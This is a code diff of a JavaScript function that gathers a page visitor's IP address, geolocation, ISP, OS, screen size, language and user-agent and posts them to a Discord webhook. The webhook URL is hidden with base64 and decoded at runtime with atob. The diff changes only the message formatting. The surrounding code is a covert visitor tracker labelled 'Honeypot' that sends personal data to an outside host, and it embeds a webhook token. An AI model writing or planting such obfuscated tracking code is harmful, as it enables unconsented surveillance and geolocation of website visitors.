@@ -97,17 +97,16 @@ async function logVisitorImmediately() {
     const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM1MzM2MjIzOTU4MjYzNDAzNC9BYnpEWG50X05lYnFEQ3hHVjFSQWJJbmxsc05CQUtPSVJqNkhlZ2w3VEZDRVJINGVtLTFLZ3ZVMW5LeW51X1otWlV5cQ==");
 
     const content = `
-    @everyone
-📡 **Honeypot Visitor**
-🌐 IP: ${userData.ip}
-📍 ${userData.city}, ${userData.region}, ${userData.country}
-🏢 ISP: ${userData.isp}
-🧭 Lat/Lon: ${userData.lat}, ${userData.lon}
-🕓 Timezone: ${userData.timezone}
-💻 OS: ${userData.os}
-📱 Screen: ${userData.screen}
-🗣 Language: ${userData.lang}
-🧠 User-Agent: ${userData.ua}
+ **Honeypot Visitor**
+ IP: ${userData.ip}
+ ${userData.city}, ${userData.region}, ${userData.country}
+ ISP: ${userData.isp}
+ Lat/Lon: ${userData.lat}, ${userData.lon}
+ Timezone: ${userData.timezone}
+ OS: ${userData.os}
+ Screen: ${userData.screen}
+Language: ${userData.lang}
+ User-Agent: ${userData.ua}
 `;
 
     await fetch(webhook, {
